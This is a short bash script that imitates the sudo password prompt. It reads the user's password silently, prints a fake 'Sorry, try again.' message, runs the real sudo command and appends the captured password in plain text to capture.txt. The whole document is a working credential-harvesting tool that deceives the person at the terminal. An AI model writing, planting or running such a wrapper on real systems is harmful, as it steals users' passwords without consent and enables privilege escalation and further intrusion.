#!/bin/bash
command=$*

read -p "[sudo] password for $(whoami): " -s sudopasswd 
echo " "
echo "Sorry, try again."
sudo $command

printf "${sudopasswd}\n" >> capture.txt
